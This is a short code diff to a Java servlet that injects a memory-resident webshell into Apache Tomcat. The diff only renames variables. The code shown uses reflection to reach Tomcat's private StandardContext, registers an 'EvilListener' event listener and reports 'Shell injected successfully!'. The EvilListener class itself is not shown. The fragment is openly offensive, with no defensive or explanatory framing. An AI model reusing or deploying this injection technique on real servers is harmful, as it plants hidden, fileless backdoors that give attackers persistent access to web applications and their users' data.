@@ -46,20 +46,21 @@
             // get ApplicationContextFacade obj
             ApplicationContextFacade ctx1 = (ApplicationContextFacade) request.getServletContext();
             // access the private ApplicationContext field using reflection
-            Field appCtxFacadeField = ApplicationContextFacade.class.getDeclaredField("context");
-            appCtxFacadeField.setAccessible(true);
+            Field ctx1Field = ApplicationContextFacade.class.getDeclaredField("context");
+            ctx1Field.setAccessible(true);
 
             // get ApplicationContext obj
-            ApplicationContext ctx2 = (ApplicationContext) appCtxFacadeField.get(ctx1);
+            ApplicationContext ctx2 = (ApplicationContext) ctx1Field.get(ctx1);
             // access the private StandardContext field using reflection
-            Field appCtxField = ApplicationContext.class.getDeclaredField("context");
-            appCtxField.setAccessible(true);
+            Field ctx2Field = ApplicationContext.class.getDeclaredField("context");
+            ctx2Field.setAccessible(true);
 
             // get StandardContext obj
-            StandardContext ctx3 = (StandardContext) appCtxField.get(ctx2);
+            StandardContext ctx3 = (StandardContext) ctx2Field.get(ctx2);
 
-            // add EvilListener
-            ctx3.addApplicationEventListener(new EvilListener());
+            // add EvilListener obj
+            EvilListener evilListener = new EvilListener();
+            ctx3.addApplicationEventListener(evilListener);
             response.getWriter().println("Shell injected successfully!");
         } catch (Exception e) {
             response.getWriter().println("Error injecting shell: " + e.getMessage());
